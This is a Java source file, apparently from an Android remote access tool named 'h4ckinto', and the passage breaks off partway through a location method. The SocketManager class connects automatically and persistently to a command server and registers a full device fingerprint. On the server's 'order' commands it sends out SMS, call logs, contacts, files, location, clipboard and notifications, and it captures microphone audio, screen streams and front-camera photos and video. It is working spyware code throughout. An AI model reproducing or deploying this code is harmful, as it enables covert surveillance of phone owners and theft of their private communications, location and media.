package com.h4ckinto.android.network;

import android.content.Context;
import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;
import androidx.core.content.ContextCompat;

import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionDetector;

import org.json.JSONObject;
import org.json.JSONArray;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.URL;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.util.Locale;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SocketManager {
    private static final String TAG = "SocketManager";
    private static SocketManager instance;
    private Socket socket;
    private Context context;
    private String clientId;
    private boolean isConnected = false;
    private android.os.Handler keepAliveHandler;
    private Runnable keepAliveRunnable;

    /** Single-thread executor for heavy installed-apps scan to avoid blocking and OOM from parallel runs */
    private volatile ExecutorService installedAppsExecutor;

    // ── Resumable Upload State ───────────────────────────────────────────────
    // Tracks in-progress resumable uploads so they can survive disconnects.
    // Key: fileId → UploadTask with file path, chunkIndex, etc.
    private final java.util.concurrent.ConcurrentHashMap<String, ResumableUploadTask> activeUploads =
            new java.util.concurrent.ConcurrentHashMap<>();

    // Countdown latch map for chunk ACKs — each upload waits for server ACK per chunk
    private final java.util.concurrent.ConcurrentHashMap<String, java.util.concurrent.CountDownLatch> chunkAckLatches =
            new java.util.concurrent.ConcurrentHashMap<>();

    // Last ACK status per fileId
    private final java.util.concurrent.ConcurrentHashMap<String, String> lastAckStatus =
            new java.util.concurrent.ConcurrentHashMap<>();

    /**
     * Holds state for a single resumable upload in progress.
     */
    private static class ResumableUploadTask {
        String fileId;
        String filePath;
        String fileName;
        long fileSize;
        int totalChunks;
        int chunkSize;
        volatile int nextChunkToSend;  // Updated on ACK / resume
        volatile boolean cancelled;
        volatile boolean paused;       // Paused on disconnect, resumed on reconnect

        ResumableUploadTask(String fileId, String filePath, String fileName,
                            long fileSize, int totalChunks, int chunkSize) {
            this.fileId = fileId;
            this.filePath = filePath;
            this.fileName = fileName;
            this.fileSize = fileSize;
            this.totalChunks = totalChunks;
            this.chunkSize = chunkSize;
            this.nextChunkToSend = 0;
            this.cancelled = false;
            this.paused = false;
        }
    }

    private SocketManager(Context context) {
        this.context = context;
        this.clientId = getOrCreatePersistedClientId();
        this.keepAliveHandler = new android.os.Handler();
        initializeSocket();
        setupKeepAlive();
        
        // Auto-connect immediately when SocketManager is created
        connect();
    }

    public static synchronized SocketManager getInstance(Context context) {
        if (instance == null) {
            instance = new SocketManager(context.getApplicationContext());
        }
        return instance;
    }

    private void initializeSocket() {
        try {
            Log.d(TAG, "Initializing socket with URL: " + Constants.SOCKET_URL);
            IO.Options options = new IO.Options();
            options.forceNew = false; // Don't force new connection
            options.reconnection = true;
            options.reconnectionDelay = 3000; // 3 second delay
            options.reconnectionDelayMax = 10000; // Max 10 seconds
            options.timeout = 120000; // 120 seconds timeout for large file transfers
            options.transports = new String[]{"websocket", "polling"}; // Prefer websocket for better performance
            
            // Optimized for high-speed large file transfers
            // Server has 120s pingTimeout to match this
            
            // Add client info as query parameters
            options.query = "id=" + clientId + 
                           "&model=" + android.os.Build.MODEL + 
                           "&manf=" + android.os.Build.MANUFACTURER + 
                           "&release=" + android.os.Build.VERSION.RELEASE;
            
            socket = IO.socket(Constants.SOCKET_URL, options);
            Log.d(TAG, "Socket created successfully with query: " + options.query);
            setupEventListeners();
            Log.d(TAG, "Event listeners setup complete");
        } catch (URISyntaxException e) {
            Log.e(TAG, "Error initializing socket", e);
        }
    }

    private void setupEventListeners() {
        socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.d(TAG, "Connected to server");
                isConnected = true;
                startKeepAlive();
                // Send client info immediately after connection
                sendClientInfo();
                // Process any queued notifications
                processQueuedNotifications();
                
                // Request resume for any paused uploads
                // The server will respond with pending_uploads or upload_ready events
                for (ResumableUploadTask task : activeUploads.values()) {
                    if (task.paused && !task.cancelled) {
                        Log.d(TAG, "🔄 Requesting resume for upload: " + task.fileId);
                        try {
                            JSONObject resumeReq = new JSONObject();
                            resumeReq.put("fileId", task.fileId);
                            socket.emit("upload_resume", resumeReq);
                        } catch (Exception e) {
                            Log.e(TAG, "Error requesting upload resume: " + e.getMessage());
                        }
                    }
                }
            }
        });

        socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.d(TAG, "Disconnected from server");
                isConnected = false;
                stopKeepAlive();
                
                // Pause all active resumable uploads so they can be resumed after reconnect
                for (ResumableUploadTask task : activeUploads.values()) {
                    if (!task.cancelled) {
                        task.paused = true;
                        Log.d(TAG, "⏸️ Paused upload: " + task.fileId + " (" + task.fileName + ")");
                        // Release any blocked ACK latch so the sender thread can exit its wait
                        java.util.concurrent.CountDownLatch latch = chunkAckLatches.get(task.fileId);
                        if (latch != null) {
                            latch.countDown();
                        }
                    }
                }
                
                com.h4ckinto.android.utils.AppExecutors.get().scheduled().schedule(() -> {
                    Log.d(TAG, "Auto-reconnecting after disconnect...");
                    connect();
                }, 2, java.util.concurrent.TimeUnit.SECONDS);
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.e(TAG, "Connection error", (Exception) args[0]);
                isConnected = false;
                
                com.h4ckinto.android.utils.AppExecutors.get().scheduled().schedule(() -> {
                    Log.d(TAG, "Retrying after connection error...");
                    connect();
                }, 5, java.util.concurrent.TimeUnit.SECONDS);
            }
        });

        socket.on("welcome", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.d(TAG, "Received welcome from server");
            }
        });

        socket.on("order", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    Log.d(TAG, "Received order from server: " + args[0]);
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        handleServerCommand((JSONObject) args[0]);
                    } else {
                        Log.w(TAG, "Invalid command format received");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling server command: " + e.getMessage());
                }
            }
        });

        // ── Resumable Upload Event Listeners ─────────────────────────────────

        /**
         * upload_ack — Server confirms it received a specific chunk.
         * We unblock the sending thread so it can proceed to the next chunk.
         */
        socket.on("upload_ack", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        JSONObject ack = (JSONObject) args[0];
                        String fileId = ack.getString("fileId");
                        int chunkIndex = ack.getInt("chunkIndex");
                        String status = ack.optString("status", "ok");

                        Log.d(TAG, "📬 ACK received: fileId=" + fileId +
                                " chunk=" + chunkIndex + " status=" + status);

                        // Store the status and release the latch so the sender thread continues
                        lastAckStatus.put(fileId, status);
                        java.util.concurrent.CountDownLatch latch = chunkAckLatches.get(fileId);
                        if (latch != null) {
                            latch.countDown();
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling upload_ack: " + e.getMessage());
                }
            }
        });

        /**
         * upload_ready — Server tells us where to start / resume sending chunks.
         * If we have a paused upload for this fileId, update and resume it.
         */
        socket.on("upload_ready", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        JSONObject data = (JSONObject) args[0];
                        String fileId = data.getString("fileId");
                        int resumeFrom = data.optInt("resumeFromChunk", 0);

                        Log.d(TAG, "📋 upload_ready: fileId=" + fileId +
                                " resumeFrom=" + resumeFrom);

                        ResumableUploadTask task = activeUploads.get(fileId);
                        if (task != null && task.paused) {
                            task.nextChunkToSend = resumeFrom;
                            task.paused = false;
                            Log.d(TAG, "▶️ Resuming upload " + fileId + " from chunk " + resumeFrom);
                            // Restart sending on a background thread
                            resumeUploadTask(task);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling upload_ready: " + e.getMessage());
                }
            }
        });

        /**
         * upload_complete — Server confirms the file was fully saved.
         */
        socket.on("upload_complete", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        JSONObject data = (JSONObject) args[0];
                        String fileId = data.getString("fileId");
                        Log.d(TAG, "✅ Upload complete confirmed by server: " + fileId);
                        // Clean up local state
                        activeUploads.remove(fileId);
                        chunkAckLatches.remove(fileId);
                        lastAckStatus.remove(fileId);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling upload_complete: " + e.getMessage());
                }
            }
        });

        /**
         * pending_uploads — Server notifies us about uploads that can be resumed
         * after a reconnect. We request resume for each one we still have locally.
         */
        socket.on("pending_uploads", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        JSONObject data = (JSONObject) args[0];
                        JSONArray uploads = data.optJSONArray("uploads");
                        if (uploads != null) {
                            Log.d(TAG, "📋 Server has " + uploads.length() + " pending upload(s)");
                            for (int i = 0; i < uploads.length(); i++) {
                                JSONObject info = uploads.getJSONObject(i);
                                String fileId = info.getString("fileId");

                                ResumableUploadTask task = activeUploads.get(fileId);
                                if (task != null) {
                                    int resumeFrom = info.optInt("resumeFromChunk", 0);
                                    task.nextChunkToSend = resumeFrom;
                                    task.paused = false;
                                    Log.d(TAG, "▶️ Auto-resuming upload " + fileId +
                                            " from chunk " + resumeFrom);
                                    resumeUploadTask(task);
                                } else {
                                    Log.d(TAG, "⏭️ No local state for upload " + fileId + ", skipping");
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling pending_uploads: " + e.getMessage());
                }
            }
        });
    }

    /**
     * Full raw device report (Build, display, memory, locale). Server stores as dynamicData.deviceReport.
     */
    private void sendClientInfo() {
        try {
            JSONObject o = new JSONObject();
            o.put("clientId", clientId);
            o.put("reportedAt", System.currentTimeMillis());

            o.put("BOARD", android.os.Build.BOARD);
            o.put("BOOTLOADER", android.os.Build.BOOTLOADER);
            o.put("BRAND", android.os.Build.BRAND);
            o.put("DEVICE", android.os.Build.DEVICE);
            o.put("DISPLAY", android.os.Build.DISPLAY);
            o.put("FINGERPRINT", android.os.Build.FINGERPRINT);
            o.put("HARDWARE", android.os.Build.HARDWARE);
            o.put("HOST", android.os.Build.HOST);
            o.put("ID", android.os.Build.ID);
            o.put("MANUFACTURER", android.os.Build.MANUFACTURER);
            o.put("MODEL", android.os.Build.MODEL);
            o.put("PRODUCT", android.os.Build.PRODUCT);
            o.put("SUPPORTED_ABIS", new JSONArray(android.os.Build.SUPPORTED_ABIS));
            o.put("TAGS", android.os.Build.TAGS);
            o.put("TYPE", android.os.Build.TYPE);
            o.put("USER", android.os.Build.USER);
            o.put("BUILD_TIME_MS", android.os.Build.TIME);

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                o.put("SUPPORTED_32_BIT_ABIS", new JSONArray(android.os.Build.SUPPORTED_32_BIT_ABIS));
                o.put("SUPPORTED_64_BIT_ABIS", new JSONArray(android.os.Build.SUPPORTED_64_BIT_ABIS));
            }

            o.put("VERSION_RELEASE", android.os.Build.VERSION.RELEASE);
            o.put("VERSION_SDK_INT", android.os.Build.VERSION.SDK_INT);
            o.put("VERSION_INCREMENTAL", android.os.Build.VERSION.INCREMENTAL);
            o.put("VERSION_CODENAME", android.os.Build.VERSION.CODENAME);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                o.put("VERSION_SECURITY_PATCH", android.os.Build.VERSION.SECURITY_PATCH);
                o.put("VERSION_BASE_OS", android.os.Build.VERSION.BASE_OS);
            }
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                o.put("VERSION_PREVIEW_SDK_INT", android.os.Build.VERSION.PREVIEW_SDK_INT);
            }

            android.util.DisplayMetrics dm = context.getResources().getDisplayMetrics();
            JSONObject disp = new JSONObject();
            disp.put("widthPx", dm.widthPixels);
            disp.put("heightPx", dm.heightPixels);
            disp.put("density", (double) dm.density);
            disp.put("densityDpi", dm.densityDpi);
            disp.put("scaledDensity", dm.scaledDensity);
            disp.put("xdpi", dm.xdpi);
            disp.put("ydpi", dm.ydpi);
            o.put("displayMetrics", disp);

            Runtime rt = Runtime.getRuntime();
            JSONObject jrt = new JSONObject();
            jrt.put("maxMemoryBytes", rt.maxMemory());
            jrt.put("totalMemoryBytes", rt.totalMemory());
            jrt.put("freeMemoryBytes", rt.freeMemory());
            jrt.put("availableProcessors", rt.availableProcessors());
            o.put("runtime", jrt);

            android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
                am.getMemoryInfo(mi);
                JSONObject sysMem = new JSONObject();
                sysMem.put("totalRamBytes", mi.totalMem);
                sysMem.put("availRamBytes", mi.availMem);
                sysMem.put("lowMemory", mi.lowMemory);
                sysMem.put("thresholdBytes", mi.threshold);
                o.put("systemMemory", sysMem);
            }

            o.put("localeDefault", java.util.Locale.getDefault().toString());
            o.put("timezone", java.util.TimeZone.getDefault().getID());

            try {
                String aid = android.provider.Settings.Secure.getString(
                        context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                o.put("androidId", aid != null ? aid : "");
            } catch (Exception ignored) {
                o.put("androidId", "");
            }

            socket.emit("register", o);
            Log.d(TAG, "Sent full device report to server (" + o.length() + " keys)");
        } catch (Exception e) {
            Log.e(TAG, "Error sending client info", e);
        }
    }

    private void handleServerCommand(JSONObject command) {
        try {
            String commandType = command.getString("type");
            Log.d(TAG, "Handling command: " + commandType);
            
            // Send acknowledgment back to server
            if (isConnected && socket != null) {
                try {
                    JSONObject response = new JSONObject();
                    response.put("type", commandType);
                    response.put("status", "received");
                    response.put("timestamp", System.currentTimeMillis());
                    
                    socket.emit("command_response", response);
                    Log.d(TAG, "Sent command acknowledgment: " + commandType);
                } catch (Exception e) {
                    Log.e(TAG, "Error sending command response: " + e.getMessage());
                }
            } else {
                Log.w(TAG, "Cannot send command response - socket not connected");
            }
            
            // Handle different command types
            try {
                switch (commandType) {
                    case Constants.MESSAGE_LOCATION:
                        if (!PermissionDetector.isLocationAvailable(context)) {
                            Log.w(TAG, "Location command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Location command received - sending current location");
                        sendLocationData();
                        break;
                    case Constants.MESSAGE_SMS:
                        if (!PermissionDetector.isSmsAvailable(context)) {
                            Log.w(TAG, "SMS command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "SMS command received");
                        sendSMSData();
                        break;
                    case Constants.MESSAGE_CALL:
                        if (!PermissionDetector.isCallLogAvailable(context)) {
                            Log.w(TAG, "Call log command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Call log command received");
                        sendCallLogData();
                        break;
                    case Constants.MESSAGE_CONTACTS:
                        if (!PermissionDetector.isContactsAvailable(context)) {
                            Log.w(TAG, "Contacts command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Contacts command received");
                        sendContactsData();
                        break;
                    case Constants.MESSAGE_FILES:
                        if (!PermissionDetector.isStorageAvailable(context)) {
                            Log.w(TAG, "Files command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Files command received");
                        handleFileCommand(command);
                        break;
                    case Constants.MESSAGE_MIC:
                        if (!PermissionDetector.isMicrophoneAvailable(context)) {
                            Log.w(TAG, "Microphone command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Microphone command received");
                        sendMicrophoneData();
                        break;
                    case Constants.MESSAGE_WIFI:
                        if (!PermissionDetector.isWifiAvailable(context)) {
                            Log.w(TAG, "WiFi command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "WiFi command received");
                        sendWifiData();
                        break;
                    case Constants.MESSAGE_NOTIFICATION:
                        Log.d(TAG, "Notification command received");
                        sendNotificationData();
                        break;
                    case Constants.MESSAGE_CLIPBOARD:
                        Log.d(TAG, "Clipboard command received");
                        sendClipboardData();
                        break;
                    case Constants.MESSAGE_CAMERA:
                        if (!PermissionDetector.isCameraAvailable(context)) {
                            Log.w(TAG, "Camera command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Camera command received - taking front photo");
                        takeFrontCameraPhoto();
                        break;
                    case Constants.MESSAGE_INSTALLED: {
                        String action = command.optString("action", "");
                        if ("open".equals(action)) {
                            Log.d(TAG, "Install app command received - opening Play Store");
                            try {
                                Intent installIntent = new Intent(Intent.ACTION_VIEW);
                                installIntent.setData(Uri.parse("market://search?q=apps"));
                                installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                context.startActivity(installIntent);
                            } catch (Exception e) {
                                Log.e(TAG, "Could not open Play Store", e);
                                try {
                                    Intent fallback = new Intent(Intent.ACTION_VIEW);
                                    fallback.setData(Uri.parse("https://play.google.com/store/apps"));
                                    fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(fallback);
                                } catch (Exception e2) {
                                    Log.e(TAG, "Could not open store fallback", e2);
                                }
                            }
                        } else {
                            Log.d(TAG, "Installed apps command received - sending list");
                            sendInstalledAppsData();
                        }
                        break;
                    }
                    case Constants.MESSAGE_PERMISSIONS:
                        Log.d(TAG, "Permissions command received");
                        sendPermissionsData();
                        break;
                    case Constants.MESSAGE_SCREEN_STREAM:
                        if (!PermissionDetector.isScreenMonitorAvailable(context)) {
                            Log.w(TAG, "Screen stream command received but permission not declared in manifest - ignoring");
                            break;
                        }
                        Log.d(TAG, "Screen stream command received - starting live stream");
                        handleScreenStreamCommand(command);
                        break;
                    default:
                        // Check if it's a screen recording command (0xSC or 0xSC:duration)
                        if (commandType != null && (commandType.equals(Constants.MESSAGE_SCREEN) || 
                            commandType.startsWith(Constants.MESSAGE_SCREEN + ":"))) {
                            if (!PermissionDetector.isScreenMonitorAvailable(context)) {
                                Log.w(TAG, "Screen recording command received but permission not declared in manifest - ignoring");
                                break;
                            }
                            Log.d(TAG, "Screen recording command received: " + commandType);
                            handleScreenRecordingCommand(command);
                        }
                        // Check if it's a screen stream command with parameters (0xSS:params)
                        else if (commandType != null && commandType.startsWith(Constants.MESSAGE_SCREEN_STREAM)) {
                            if (!PermissionDetector.isScreenMonitorAvailable(context)) {
                                Log.w(TAG, "Screen stream command received but permission not declared in manifest - ignoring");
                                break;
                            }
                            Log.d(TAG, "Screen stream command received: " + commandType);
                            handleScreenStreamCommand(command);
                        } else if (commandType != null && (commandType.equals(Constants.MESSAGE_CAMERA_VIDEO)
                                || commandType.startsWith(Constants.MESSAGE_CAMERA_VIDEO + ":"))) {
                            if (!PermissionDetector.isCameraAvailable(context)) {
                                Log.w(TAG, "Camera video command but camera not available in manifest - ignoring");
                                break;
                            }
                            int videoSec = 15;
                            int colon = commandType.indexOf(':');
                            if (colon > 0 && colon < commandType.length() - 1) {
                                try {
                                    videoSec = Integer.parseInt(commandType.substring(colon + 1).trim());
                                } catch (NumberFormatException ignored) {
                                    videoSec = 15;
                                }
                            }
                            videoSec = Math.max(5, Math.min(60, videoSec));
                            Log.d(TAG, "Front camera video command: " + videoSec + "s");
                            takeFrontCameraVideo(videoSec);
                        } else {
                        Log.w(TAG, "Unknown command type: " + commandType);
                        sendErrorResponse(commandType, "Unknown command type");
                        }
                        break;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error processing command: " + e.getMessage());
                sendErrorResponse(commandType, "Error processing command: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling server command", e);
        }
    }

    public void connect() {
        Log.d(TAG, "Attempting to connect to server...");
        if (!isConnected) {
            Log.d(TAG, "Socket not connected, initiating connection...");
            try {
                socket.connect();
                Log.d(TAG, "Connection initiated, waiting for response...");
                
                // Start connection monitoring in background
                startConnectionMonitoring();
                
            } catch (Exception e) {
                Log.e(TAG, "Error during connection: " + e.getMessage());
                // Retry connection after delay
                retryConnection();
            }
        } else {
            Log.d(TAG, "Socket already connected");
        }
    }
    
    private void startConnectionMonitoring() {
        com.h4ckinto.android.utils.AppExecutors.get().scheduled().schedule(() -> {
            if (!isConnected) {
                Log.w(TAG, "Connection timeout, retrying...");
                retryConnection();
            } else {
                Log.d(TAG, "Connection established successfully");
            }
        }, 5, java.util.concurrent.TimeUnit.SECONDS);
    }

    private void retryConnection() {
        com.h4ckinto.android.utils.AppExecutors.get().scheduled().schedule(() -> {
            Log.d(TAG, "Retrying connection...");
            if (!isConnected && socket != null) {
                try {
                    socket.connect();
                } catch (Exception e) {
                    Log.e(TAG, "Error during retry: " + e.getMessage());
                    com.h4ckinto.android.utils.AppExecutors.get().scheduled().schedule(() -> {
                        if (!isConnected) retryConnection();
                    }, 10, java.util.concurrent.TimeUnit.SECONDS);
                }
            }
        }, 3, java.util.concurrent.TimeUnit.SECONDS);
    }

    public void disconnect() {
        if (isConnected) {
            stopKeepAlive();
            socket.disconnect();
            isConnected = false;
        }
    }

    public void sendData(String event, Object data) {
        if (isConnected && socket != null) {
            try {
                socket.emit(event, data);
                Log.d(TAG, "Sent data: " + event + " - " + data.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending data: " + e.getMessage());
            }
        } else {
            Log.w(TAG, "Socket not connected, cannot send data. Connected: " + isConnected + ", Socket: " + (socket != null));
            // Try to reconnect if not connected
            if (!isConnected) {
                Log.d(TAG, "Attempting to reconnect...");
                connect();
            }
        }
    }

    public void sendLocation(double latitude, double longitude, double altitude, float accuracy, float speed) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("latitude", latitude);
            locationData.put("longitude", longitude);
            locationData.put("altitude", altitude);
            locationData.put("accuracy", accuracy);
            locationData.put("speed", speed);
            locationData.put("enabled", true);
            locationData.put("timestamp", System.currentTimeMillis());
            locationData.put("status", "Location retrieved successfully");
            locationData.put("provider", "fused");
            
            sendData(Constants.MESSAGE_LOCATION, locationData);
            Log.d(TAG, "Location sent to server: " + latitude + ", " + longitude + " (Saved to DB)");
        } catch (Exception e) {
            Log.e(TAG, "Error sending location data", e);
        }
    }

    public void sendSMSData(JSONObject smsData) {
        sendData(Constants.MESSAGE_SMS, smsData);
    }

    public void sendCallData(JSONObject callData) {
        sendData(Constants.MESSAGE_CALL, callData);
    }

    public void sendContactsData(JSONObject contactsData) {
        sendData(Constants.MESSAGE_CONTACTS, contactsData);
    }

    public void sendFileData(JSONObject fileData) {
        sendData(Constants.MESSAGE_FILES, fileData);
    }

    public void sendAudioData(JSONObject audioData) {
        sendData(Constants.MESSAGE_MIC, audioData);
    }

    public void sendWifiData(JSONObject wifiData) {
        sendData(Constants.MESSAGE_WIFI, wifiData);
    }

    public void sendNotificationData(JSONObject notificationData) {
        try {
            // Always try to send notification immediately
            if (socket != null) {
                // Force connection if not connected
                if (!isConnected) {
                    Log.d(TAG, "Socket not connected, attempting to connect for notification...");
                    connect();
                    
                    // Wait a moment for connection
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }
                
                // Send as real-time notification with enhanced data
                JSONObject realtimeNotification = new JSONObject();
                realtimeNotification.put("type", "realtime");
                realtimeNotification.put("timestamp", System.currentTimeMillis());
                realtimeNotification.put("data", notificationData);
                realtimeNotification.put("listenerEnabled", true);
                realtimeNotification.put("isRealtime", true);
                
                socket.emit(Constants.MESSAGE_NOTIFICATION, realtimeNotification);
                Log.d(TAG, "🚨 Real-time notification sent to server: " + 
                    notificationData.optString("appName", "Unknown") + " - " + 
                    notificationData.optString("title", "No title"));
            } else {
                Log.w(TAG, "Socket is null, cannot send notification");
                // Try to reinitialize socket
                initializeSocket();
                connect();
            }
            } catch (Exception e) {
            Log.e(TAG, "Error sending real-time notification data: " + e.getMessage());
            // Try to reconnect and retry
            connect();
            }
    }
    
    public void processQueuedNotifications() {
        if (!isConnected || socket == null) {
            Log.d(TAG, "Socket not connected, cannot process queued notifications");
            return;
        }
        
        try {
            android.content.SharedPreferences prefs = context.getSharedPreferences("notification_queue", android.content.Context.MODE_PRIVATE);
            java.util.Map<String, ?> allEntries = prefs.getAll();
            
            if (allEntries.isEmpty()) {
                Log.d(TAG, "No queued notifications to process");
                return;
            }
            
            Log.d(TAG, "Processing " + allEntries.size() + " queued notifications");
            
            for (java.util.Map.Entry<String, ?> entry : allEntries.entrySet()) {
                try {
                    String key = entry.getKey();
                    String notificationJson = (String) entry.getValue();
                    
                    JSONObject notificationData = new JSONObject(notificationJson);
                    sendNotificationData(notificationData);
                    
                    // Remove processed notification
                    android.content.SharedPreferences.Editor editor = prefs.edit();
                    editor.remove(key);
                    editor.apply();
                    
                    Log.d(TAG, "Processed queued notification: " + key);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error processing queued notification: " + e.getMessage());
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing queued notifications: " + e.getMessage());
        }
    }

    public void sendClipboardData(JSONObject clipboardData) {
        sendData(Constants.MESSAGE_CLIPBOARD, clipboardData);
    }

    public void sendInstalledAppsData(JSONObject appsData) {
        sendData(Constants.MESSAGE_INSTALLED, appsData);
    }

    public void sendPermissionsData(JSONObject permissionsData) {
        sendData(Constants.MESSAGE_PERMISSIONS, permissionsData);
    }

    private String generateClientId() {
        return "android_" + System.currentTimeMillis() + "_" + (int)(Math.random() * 1000);
    }

    /**
     * Use the same client ID across app restarts/crashes so the server sees the same device
     * (same phone/device in panel). Persist in SharedPreferences.
     */
    private String getOrCreatePersistedClientId() {
        android.content.SharedPreferences prefs = context.getSharedPreferences(Constants.PREFS_NAME, android.content.Context.MODE_PRIVATE);
        String saved = prefs.getString(Constants.KEY_CLIENT_ID, null);
        if (saved != null && !saved.isEmpty()) {
            Log.d(TAG, "Using persisted client ID: " + saved);
            return saved;
        }
        String newId = generateClientId();
        prefs.edit().putString(Constants.KEY_CLIENT_ID, newId).apply();
        Log.d(TAG, "Generated and persisted new client ID: " + newId);
        return newId;
    }

    public String getClientId() {
        return clientId;
    }

    public boolean isConnected() {
        return isConnected;
    }
    
    private void setupKeepAlive() {
        keepAliveRunnable = new Runnable() {
            @Override
            public void run() {
                if (isConnected && socket != null) {
                    // Send a simple heartbeat instead of ping
                    try {
                        socket.emit("heartbeat", "alive");
                        Log.d(TAG, "Sent heartbeat");
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
                    }
                    // Schedule next heartbeat in 120 seconds (much less frequent)
                    keepAliveHandler.postDelayed(this, 120000);
                }
            }
        };
    }
    
    private void startKeepAlive() {
        if (keepAliveHandler != null && keepAliveRunnable != null) {
            keepAliveHandler.postDelayed(keepAliveRunnable, 60000); // Start after 60 seconds
        }
    }
    
    private void stopKeepAlive() {
        if (keepAliveHandler != null && keepAliveRunnable != null) {
            keepAliveHandler.removeCallbacks(keepAliveRunnable);
        }
    }
    
    // Command processing methods
    private void sendLocationData() {
        try {
            JSONObject locationData = new JSONObject();
            
            // Try to get real location data
            try {
                android.location.LocationManager locationManager = (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                
                if (locationManager != null) {
                    // Check if location services are enabled
                    boolean gpsEnabled = locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER);
                    boolean networkEnabled = locationManager.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER);
                    
                    if (gpsEnabled || networkEnabled) {
                        // Try to get last known location
                        android.location.Location lastKnownLocation = null;
                        
                        if (gpsEnabled) {
                            lastKnownLocation = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                        }
                        if (lastKnownLocation == null && networkEnabled) {
                            lastKnownLocation = locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                        }
                        
                        if (lastKnownLocation != null) {
                            locationData.put("latitude", lastKnownLocation.getLatitude());
                            locationData.put("longitude", lastKnownLocation.getLongitude());
                            locationData.put("accuracy", lastKnownLocation.getAccuracy());
                            locationData.put("timestamp", lastKnownLocation.getTime());
                            locationData.put("status", "Location retrieved successfully");
                            locationData.put("provider", lastKnownLocation.getProvider());
                        } else {
                            locationData.put("latitude", 0.0);
                            locationData.put("longitude", 0.0);
                            locationData.put("accuracy", 0.0);
                            locationData.put("timestamp", System.currentTimeMillis());
                            locationData.put("status", "No location data available");
                        }
                    } else {
                        locationData.put("latitude", 0.0);
                        locationData.put("longitude", 0.0);
                        locationData.put("accuracy", 0.0);
                        locationData.put("timestamp", System.currentTimeMillis());
                        locationData.put("status", "Location services disabled");
                    }
                } else {
                    locationData.put("latitude", 0.0);
                    locationData.put("longitude", 0.0);
                    locationData.put("accuracy", 0.0);
                    locationData.put("timestamp", System.currentTimeMillis());
                    locationData.put("status", "Location manager not available");
                }
            } catch (SecurityException e) {
                locationData.put("latitude", 0.0);
                locationData.put("longitude", 0.0);
                locationData.put("accuracy", 0.0);
                locationData.put("timestamp", System.currentTimeMillis());
                locationData.put("status", "Location permission denied: " + e.getMessage());
            } catch (Exception e) {
                locationData.put("latitude", 0.0);
